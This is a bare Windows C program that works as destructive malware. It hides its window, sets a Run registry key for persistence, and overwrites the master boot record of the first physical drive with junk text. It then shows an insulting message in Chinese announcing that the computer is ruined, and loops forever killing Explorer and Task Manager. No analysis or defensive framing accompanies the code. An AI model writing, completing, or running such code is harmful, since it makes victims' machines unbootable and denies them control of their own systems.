
#include <windows.h>
#pragma comment( linker, "/subsystem:/"windows/" /entry:/"mainCRTStartup/"" )
int main(void)
{
	HKEY hRoot = HKEY_LOCAL_MACHINE;
	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char *szModule = "D:\\software\\eclipse\\eclipse.exe";

	HKEY hKey;

	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
	LONG lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, 
		KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	if(lRet != ERROR_SUCCESS)
	{
		printf("failed to find !\n");
		return -1;
	}

	lRet = RegSetValueEx(hKey, "eclipse", 0, REG_SZ, (BYTE *)szModule, strlen(szModule));

	RegCloseKey(hKey);

	if(lRet != ERROR_SUCCESS)
	{
		printf("failed to reg !\n");
		return -1;
	}
	LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
	char code[]=
		"NMSL NMSL SNMS NMSL 53 4 4 432 1 1232 "
		"NMSL NMSL SNMS NMSL 53 4 4 432 1 1232 "
		"NMSL NMSL SNMS NMSL 53 4 4 432 1 1232 "
		"NMSL NMSL SNMS NMSL 53 4 4 432 1 1232 ";
	BYTE MBR[512];
	DWORD s=NULL,t=NULL;
	HANDLE handle=NULL;
	memcpy(MBR,code,sizeof(code)-1);
	handle=CreateFileA(
		DiskFileName,
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		0,
		0);
	if(handle==INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL,(LPCSTR)"Can't Create File!",(LPCSTR)"error",MB_OK);
		return 0;
	}else{
		WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
		DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
		CloseHandle(handle);
		MessageBoxA(NULL,(LPCSTR)"successful",(LPCSTR)"ok",MB_OK);
	}
	MessageBox(NULL, "傻逼，Fake You。重启？这将导致你的电脑GG。好好享受这最后的时光吧=)", "GG Computer", MB_OK);
	while(1){
		system("taskkill /f /im explorer.exe");
		system("taskkill /f /im taskmgr.exe");
	} 
	return 0;
}
